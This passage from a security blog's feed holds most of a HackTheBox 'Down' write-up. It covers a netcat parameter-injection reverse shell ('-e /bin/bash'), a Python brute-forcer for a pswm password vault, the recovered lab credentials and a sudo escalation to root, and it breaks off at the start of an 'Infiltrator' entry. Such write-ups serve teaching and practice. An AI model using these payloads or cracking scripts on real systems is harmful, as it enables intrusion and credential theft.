" /> </picture> <h4 id="curl-code">curl Code</h4> <p>The code that handles POST requests looks like:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'tcp'</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'port'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> <span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span> <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]))</span> <span class="p">{</span> <span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span> <span class="p">}</span> </code></pre></div></div> <p>The code that handles <code class="language-plaintext highlighter-rouge">curl</code> looks about like I would expect:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$url</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]);</span> <span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'|^https?://|'</span><span class="p">,</span><span class="nv">$url</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$rc</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span> <span class="nv">$ec</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="s2">"/usr/bin/curl -s </span><span class="nv">$url</span><span class="s2">"</span><span class="p">);</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$ec</span> <span class="mf">.</span> <span class="s2">" 2&gt;&amp;1"</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$rc</span><span class="p">);</span> <span class="k">echo</span> <span class="s1">'&lt;div class="output" id="outputSection"&gt;'</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span> <span class="nv">$rc</span> <span class="o">===</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"&lt;font size=+1&gt;It is up. It's just you! =␝&lt;/font&gt;&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span> <span class="k">echo</span> <span class="s1">'&lt;p id="outputDetails"&gt;&lt;pre&gt;'</span><span class="mf">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$output</span><span class="p">))</span><span class="mf">.</span><span class="s1">'&lt;/pre&gt;&lt;/p&gt;'</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"&lt;font size=+1&gt;It is down for everyone! =␔&lt;/font&gt;&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s1">'&lt;div class="output" id="outputSection"&gt;'</span><span class="p">;</span> <span class="k">echo</span> <span class="s1">'&lt;font color=red size=+1&gt;Only protocols http or https allowed.&lt;/font&gt;'</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> </code></pre></div></div> <p>On the third line there’s a <code class="language-plaintext highlighter-rouge">preg_match</code> looking for <code class="language-plaintext highlighter-rouge">http://</code> or <code class="language-plaintext highlighter-rouge">https://</code> at the start of the <code class="language-plaintext highlighter-rouge">$url</code>. Then it actually uses <code class="language-plaintext highlighter-rouge">exec</code> to run the <code class="language-plaintext highlighter-rouge">curl</code> binary, though wrapped in <code class="language-plaintext highlighter-rouge">escapeshellcmd</code> to block command injection.</p> <h4 id="socket-code">Socket Code</h4> <p>The expertmode code starts by validating that the given IP is an IP:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'tcp'</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'port'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">]);</span> <span class="nv">$valid_ip</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_IP</span><span class="p">);</span> </code></pre></div></div> <p>Then it does the same for the port:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$port</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'port'</span><span class="p">]);</span> <span class="nv">$port_int</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$port</span><span class="p">);</span> <span class="nv">$valid_port</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$port_int</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_INT</span><span class="p">);</span> </code></pre></div></div> <p>Only if both are valid does it continue. then it uses <code class="language-plaintext highlighter-rouge">nc</code> to connect to the IP / port:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span> <span class="nv">$valid_ip</span> <span class="o">&amp;&amp;</span> <span class="nv">$valid_port</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$rc</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span> <span class="nv">$ec</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="s2">"/usr/bin/nc -vz </span><span class="nv">$ip</span><span class="s2"> </span><span class="nv">$port</span><span class="s2">"</span><span class="p">);</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$ec</span> <span class="mf">.</span> <span class="s2">" 2&gt;&amp;1"</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$rc</span><span class="p">);</span> </code></pre></div></div> <h3 id="exploit">Exploit</h3> <h4 id="vulnerability">Vulnerability</h4> <p>The problem with the above code is that it converts the <code class="language-plaintext highlighter-rouge">$port</code> value to an int (<code class="language-plaintext highlighter-rouge">$port_int</code>) and validates that value, but then it uses the original input in the command!</p> <p><code class="language-plaintext highlighter-rouge">intval</code> will get the valid integer from the start of the string:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">php &gt; </span><span class="k">echo</span> <span class="nb">intval</span><span class="p">(</span><span class="s2">"1234 this is a test"</span><span class="p">);</span> <span class="go">1234 </span></code></pre></div></div> <p>So this code turns the string into an int, validates that it’s an int, and then uses the original string!</p> <p><code class="language-plaintext highlighter-rouge">escapeshellcmd</code> will prevent command injection, but it will not prevent parameter injection. So I can send <code class="language-plaintext highlighter-rouge">-e /bin/bash</code> and try to get a shell!</p> <h4 id="shell">Shell</h4> <p>Client side validation rules prevent me from entering my payload directly into the form:</p> <picture> <source type="image/webp" srcset="/img/image-20250502180111558.webp" /> <img loading="lazy" src="/img/image-20250502180111558.png" alt="image-20250502180111558" class="include_image " /> </picture> <p>I’ll send a legit request to Burp Repeater, and add my payload:</p> <picture> <source type="image/webp" srcset="/img/image-20250502180428208.webp" /> <img loading="lazy" src="/img/image-20250502180428208.png" alt="image-20250502180428208" class="include_image " /> </picture> <p>This request just hangs, but after a few seconds, there’s a connection at my listening <code class="language-plaintext highlighter-rouge">nc</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443 <span class="go">Listening on 0.0.0.0 443 Connection received on 10.129.234.87 45706 </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">nc -e /bin/bash</code> doesn’t print a prompt, but I’ll enter <code class="language-plaintext highlighter-rouge">id</code> and it returns the results:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443 <span class="go">Listening on 0.0.0.0 443 Connection received on 10.129.234.87 45706 </span><span class="gp">‍</span><span class="nb">id</span> <span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data) </span></code></pre></div></div> <p>I’ll upgrade my shell using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www/html$ </span>script /dev/null <span class="nt">-c</span> /bin/bash <span class="go">Script started, output log file is '/dev/null'. </span><span class="gp">www-data@down:/var/www/html$ </span>^Z <span class="go">[1]+ Stopped nc -lnvp 443 </span><span class="gp">oxdf@hacky$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span> <span class="go">nc -lnvp 443 </span><span class="gp">‍</span><span class="w"> </span>reset <span class="go">reset: unknown terminal type unknown Terminal type? screen </span><span class="gp">www-data@down:/var/www/html$ </span><span class="w"> </span></code></pre></div></div> <p>The user flag is in www-data’s home directory in the <code class="language-plaintext highlighter-rouge">html</code> folder:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span> <span class="go">index.php logo.png style.css user_aeT1xa.txt </span><span class="gp">www-data@down:/var/www/html$</span><span class="w"> </span><span class="nb">cat </span>user_aeT1xa.txt <span class="go">d4bc94b386ef7c8113698a8c4951cacd </span></code></pre></div></div> <h2 id="shell-as-root">Shell as root</h2> <h3 id="enumeration">Enumeration</h3> <h4 id="web-configuration">Web Configuration</h4> <p>The only webserver directory in <code class="language-plaintext highlighter-rouge">/var/www</code> is <code class="language-plaintext highlighter-rouge">html</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www$</span><span class="w"> </span><span class="nb">ls</span> <span class="go">html </span></code></pre></div></div> <p>It contains only the one PHP page, an image, and a stylesheet:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www$</span><span class="w"> </span><span class="nb">ls </span>html/ <span class="go">index.php logo.png style.css </span></code></pre></div></div> <p>The only Apache configuration file shows this one site:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/etc/apache2/sites-enabled$ </span><span class="nb">cat </span>000-default.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'#'</span> | <span class="nb">grep</span> <span class="nb">.</span> <span class="go">&lt;VirtualHost *:80&gt; ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined &lt;/VirtualHost&gt; </span></code></pre></div></div> <h4 id="users">Users</h4> <p>There is one home directory in <code class="language-plaintext highlighter-rouge">/home</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home$</span><span class="w"> </span><span class="nb">ls</span> <span class="go">aleks </span></code></pre></div></div> <p>Interestingly, www-data can access it:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f <span class="go">./.bashrc ./.sudo_as_admin_successful ./.local/share/pswm/pswm find: './.cache': Permission denied find: './.ssh': Permission denied ./.profile ./.bash_logout </span></code></pre></div></div> <p>www-data can’t access <code class="language-plaintext highlighter-rouge">.cache</code> or <code class="language-plaintext highlighter-rouge">.ssh</code>, but there’s another interesting file, <code class="language-plaintext highlighter-rouge">pswm</code>.</p> <h4 id="pswm">pswm</h4> <p><a href="https://github.com/Julynx/pswm">pswm</a> is a:</p> <blockquote> <p><em>A simple command line password manager written in Python.</em></p> </blockquote> <p>It’s installed in <code class="language-plaintext highlighter-rouge">/usr/bin</code> on Down:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span>which pswm <span class="go">/usr/bin/pswm </span></code></pre></div></div> <p>Running it as www-data errors out:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span>pswm <span class="go">Traceback (most recent call last): File "/usr/bin/pswm", line 393, in &lt;module&gt; PASS_VAULT_FILE = get_xdg_data_path("pswm") File "/usr/bin/pswm", line 89, in get_xdg_data_path return _get_xdg_path(env="XDG_DATA_HOME", File "/usr/bin/pswm", line 60, in _get_xdg_path os.makedirs(config, exist_ok=True) File "/usr/lib/python3.10/os.py", line 215, in makedirs makedirs(head, exist_ok=exist_ok) File "/usr/lib/python3.10/os.py", line 215, in makedirs makedirs(head, exist_ok=exist_ok) File "/usr/lib/python3.10/os.py", line 225, in makedirs mkdir(name, mode) PermissionError: [Errno 13] Permission denied: '/var/www/.local' </span></code></pre></div></div> <p>It’s trying to read in <code class="language-plaintext highlighter-rouge">/var/www/.local</code> and failing. I could try to make that directory, but www-data doesn’t have permissions:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span><span class="nb">mkdir</span> <span class="nt">-p</span> ~/.local/share/pswm <span class="go">mkdir: cannot create directory '/var/www/.local': Permission denied </span></code></pre></div></div> <p>The file itself looks like base64-encoded and likely encrypted data:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/home/aleks$</span><span class="w"> </span><span class="nb">cat</span> .local/share/pswm/pswm <span class="go">e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ== </span></code></pre></div></div> <p>There are “*” separating four different encoded strings.</p> <h3 id="decrypt-password-vault">Decrypt Password Vault</h3> <h4 id="manually">Manually</h4> <p>The <code class="language-plaintext highlighter-rouge">pswm</code> script is not that long, and lives in one file. On <a href="https://github.com/Julynx/pswm/blob/main/pswm#L322-L345">line 322</a>, there’s a function, <code class="language-plaintext highlighter-rouge">encrypted_file_to_lines</code>:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypted_file_to_lines</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="n">master_password</span><span class="p">):</span> <span class="sh">"""</span><span class="s"> This function opens and decrypts the password vault. Args: file_name (str): The name of the file containing the password vault. master_password (str): The master password to use to decrypt the password vault. Returns: list: A list of lines containing the decrypted passwords. </span><span class="sh">"""</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isfile</span><span class="p">(</span><span class="n">file_name</span><span class="p">):</span> <span class="k">return</span> <span class="sh">""</span> <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span> <span class="n">encrypted_text</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span> <span class="n">decrypted_text</span> <span class="o">=</span> <span class="n">cryptocode</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_text</span><span class="p">,</span> <span class="n">master_password</span><span class="p">)</span> <span class="k">if</span> <span class="n">decrypted_text</span> <span class="ow">is</span> <span class="bp">False</span><span class="p">:</span> <span class="k">return</span> <span class="bp">False</span> <span class="n">decrypted_lines</span> <span class="o">=</span> <span class="n">decrypted_text</span><span class="p">.</span><span class="nf">splitlines</span><span class="p">()</span> <span class="k">return</span> <span class="n">decrypted_lines</span> </code></pre></div></div> <p>It’s using the <code class="language-plaintext highlighter-rouge">cryptocode</code> package’s <code class="language-plaintext highlighter-rouge">decrypt</code> function with the text from the file and the password. Seems easy enough to replicate. I don’t need to know the algorithm, as long as I try the same call that the legit program makes.</p> <p>This script reads in a <code class="language-plaintext highlighter-rouge">pwsm</code> file and a wordlist, and then tries each word. A bit of experimentation shows that <code class="language-plaintext highlighter-rouge">cryptocode.decrypt</code> returns <code class="language-plaintext highlighter-rouge">False</code> if the key is wrong.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /// script # requires-python = "&gt;=3.12" # dependencies = [ # "cryptocode", # ] # /// </span><span class="kn">import</span> <span class="n">cryptocode</span> <span class="kn">import</span> <span class="n">sys</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;pwsm file&gt; &lt;wordlist&gt;</span><span class="sh">"</span><span class="p">)</span> <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span> <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span> <span class="n">pwsm</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span> <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span> <span class="n">passwords</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">ignore</span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span> <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span> <span class="n">pt</span> <span class="o">=</span> <span class="n">cryptocode</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">pwsm</span><span class="p">,</span> <span class="n">password</span><span class="p">.</span><span class="nf">strip</span><span class="p">())</span> <span class="nf">if </span><span class="p">(</span><span class="n">pt</span><span class="p">):</span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Found password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span> <span class="nf">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span> <span class="k">break</span> </code></pre></div></div> <p>I added the dependency metadata at the top with <code class="language-plaintext highlighter-rouge">uv add --script brute-pwsm.py cryptocode</code>, and now it runs with <code class="language-plaintext highlighter-rouge">uv</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run brute-pwsm.py <span class="go">Installed 2 packages in 9ms usage: brute-pwsm.py &lt;pwsm file&gt; &lt;wordlist&gt; </span></code></pre></div></div> <p>It takes a bout three seconds to find the password, “flower”:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">time </span>uv run brute-pwsm.py pswm /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="go">Found password: flower pswm aleks flower aleks@down aleks 1uY3w22uc-Wr{xNHR~+E real 0m3.321s user 0m2.098s sys 0m1.217s </span></code></pre></div></div> <p>There’s a password for the aleks account on Down.</p> <h4 id="pswm-decryptor">pswm-decryptor</h4> <p>There is a tool on GitHub called <a href="https://github.com/seriotonctf/pswm-decryptor">pswm-decryptor</a>. I found it quite difficult to find, but once I have it, it’s made to do just what I did above, take a wordlist and an encrypted file and find the password.</p> <p>I’ll save a copy of the script on my host. It requires two dependencies, which I’ll add as in-line meta using <code class="language-plaintext highlighter-rouge">uv</code> (see <a href="/cheatsheets/uv#">my uv Cheatsheet</a> for details):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv add <span class="nt">--script</span> pswm-decrypt.py cryptocode prettytable <span class="go">Updated `pswm-decrypt.py` </span></code></pre></div></div> <p>Now I can run the script with <code class="language-plaintext highlighter-rouge">uv</code> without having to worry about virtual environments:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run pswm-decrypt.py <span class="go">Installed 4 packages in 39ms usage: pswm-decrypt.py [-h] -f FILE -w WORDLIST pswm-decrypt.py: error: the following arguments are required: -f/--file, -w/--wordlist </span></code></pre></div></div> <p>It takes just over a second with <code class="language-plaintext highlighter-rouge">rockyou.txt</code> to find the password, decrypt the file, and print the results:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">time </span>uv run pswm-decrypt.py <span class="nt">-f</span> pswm <span class="nt">-w</span> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="go">[+] Master Password: flower [+] Decrypted Data: +------------+----------+----------------------+ | Alias | Username | Password | +------------+----------+----------------------+ | pswm | aleks | flower | | aleks@down | aleks | 1uY3w22uc-Wr{xNHR~+E | +------------+----------+----------------------+ real 0m1.879s user 0m1.796s sys 0m0.075s </span></code></pre></div></div> <p>This output is prettier than mine.</p> <h3 id="shell-1">Shell</h3> <h4 id="shell-as-aleks">Shell as aleks</h4> <p>The password works with <code class="language-plaintext highlighter-rouge">su</code> to get a shell as aleks:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@down:/var/www$</span><span class="w"> </span>su - aleks <span class="go">Password: </span><span class="gp">aleks@down:~$</span><span class="w"> </span></code></pre></div></div> <p>It also works for SSH:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'1uY3w22uc-Wr{xNHR~+E'</span> ssh aleks@10.129.234.87 <span class="go">Warning: Permanently added '10.129.234.87' (ED25519) to the list of known hosts. Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64) System information as of Fri May 2 10:49:31 PM UTC 2025 System load: 0.0 Usage of /: 57.6% of 9.75GB Memory usage: 15% Swap usage: 0% Processes: 156 Users logged in: 0 IPv4 address for eth0: 10.129.234.87 IPv6 address for eth0: dead:beef::250:56ff:feb9:c2e </span><span class="gp">aleks@down:~$</span><span class="w"> </span></code></pre></div></div> <p><em>Disclaimer - I like to use <code class="language-plaintext highlighter-rouge">sshpass</code> to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.</em></p> <h4 id="shell-as-root-1">Shell as root</h4> <p>aleks can run any command as any user with <code class="language-plaintext highlighter-rouge">sudo</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">aleks@down:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span> <span class="go">[sudo] password for aleks: Matching Defaults entries for aleks on down: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty User aleks may run the following commands on down: (ALL : ALL) ALL </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">sudo -i</code> will return a root shell:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">aleks@down:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-i</span> <span class="gp">root@down:~#</span><span class="w"> </span></code></pre></div></div> <p>And I can get the root flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@down:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt <span class="go">87bb9869************************ </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-down"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="vulnlab"/>
<category term="htb-down"/>
<category term="nmap"/>
<category term="ubuntu"/>
<category term="feroxbuster"/>
<category term="ssrf"/>
<category term="ffuf"/>
<category term="burp"/>
<category term="burp-repeater"/>
<category term="curl"/>
<category term="file-read"/>
<category term="parameter-injection"/>
<category term="pwsm"/>
<category term="source-code"/>
<category term="pswm-decryptor"/>
<summary type="html">
<![CDATA[ Down has a website designed to check if a website is up. This presents an obvious SSRF, but to bypass filters and exploit it I’ll have to abuse curl’s feature of taking multiple URLs and pass a second URL with the file schema to read from the host.I’ll get access to the page source, and see there’s an expert mode that will make a raw TCP connection with netcat. I’ll use parameter injection there to get a shell. From there, I’ll dig into a pswm instance to get the next user’s password, and they have a simple sudo rule to root. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/down-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/down-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Infiltrator</title>
<link href="https://0xdf.gitlab.io/2025/06/14/htb-infiltrator.html" rel="alternate" type="text/html" title="HTB: Infiltrator"/>
<published>2025-06-14T13:45:00+00:00</published>
<updated>2025-06-14T13:45:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/06/14/htb-infiltrator</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/06/14/htb-infiltrator.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/infiltrator-cover.webp" /> <img loading="lazy" src="/img/infiltrator-cover.png" alt="Infiltrator" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Infiltrator is a very long box. It starts out with some people on a website. I’ll use those names to make usernames and brute force to find the username format. Then I’ll AS-REP-Roast to get initial creds. That user doesn’t have much, but I’ll spray the password around the other domain users and find another account with the same. This user is in the protected users group, so I’ll need to authenticate with Kerberos. From that user, Bloodhound data shows a path to another user where I’ll get a shell. There I’ll find Output Messager installed, and set up tunnels to access. I’ll find creds for a couple more pivots in the chat (including in a .NET exe from the chat), before exploiting the calendar functionality to get execution and another shell. In this users received files I’ll find a PCAP, and pull both more creds and a BitLocker backup file. I’ll find a recovery key in the backup, and connect with RDP and decrpyt the E drive to get access to a backup of the registry and NTDS information. I’ll dump that to get a shell as the next user, who has ReadGMSAPassword on a service account. That user can exploit ESC4 in the ADCS to get administrator access.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/623 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/infiltrator" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Infiltrator</a> <a href="https://hackthebox.com/machines/infiltrator" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-infiltrator.webp" /> <img src="/icons/box-infiltrator.png" alt="Infiltrator" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/infiltrator" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1829187286715470265">31 Aug 2024</a></td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">14 Jun 2025</td> </tr> <tr> <td>OS</td> <td 